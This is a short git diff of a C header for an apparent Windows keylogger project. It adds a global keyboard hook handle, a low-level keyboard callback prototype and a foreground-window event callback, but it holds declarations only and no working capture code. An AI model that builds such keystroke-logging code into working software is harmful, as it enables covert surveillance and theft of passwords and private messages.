@@ -1,8 +1,11 @@
 #ifndef KEYLOGGER_H
 #define KEYLOGGER_H
 
+#include "logs.h"
+
 #include <windows.h>
 #include <stdio.h>
+
 
 #define _WIN32_WINNT 0x0A00
 
@@ -20,10 +23,16 @@ typedef struct s_key {
 	DWORD intervalMs;
 }	t_key;
 
+
+HHOOK hKeyboardHook;
+
+
 int	    handleKeyPress(t_key *keyData);
 void	initKeylogger(t_key *keyData);
 
-void CALLBACK WinEvent(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+
+void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
 	DWORD event, // Event type
 	HWND hwnd, // Handle to the window that generated the event
 	LONG idObject,	 // Object identifier
